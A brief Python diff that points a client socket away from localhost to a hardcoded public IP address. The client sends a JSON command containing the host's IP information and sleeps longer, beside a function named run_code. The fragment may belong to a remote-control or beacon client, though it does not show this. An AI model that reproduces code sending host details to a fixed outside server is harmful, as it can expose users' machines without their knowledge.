@@ -25,7 +25,7 @@ def run_code(code):
 # Create a socket object
 client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 # Connect to the server
-server_address = ('localhost', 12345)
+server_address = ('3.18.29.6', 12345)
 client_socket.connect(server_address)
 ip_info = get_ip_info()
 command = {
@@ -43,6 +43,8 @@ json_command = json.dumps(command)
 client_socket.sendall(json_command.encode())
 
 import time
-time.sleep(600)
+time.sleep(2000)
+
+# đóng kết nối
     
-        
+client_socket.close()
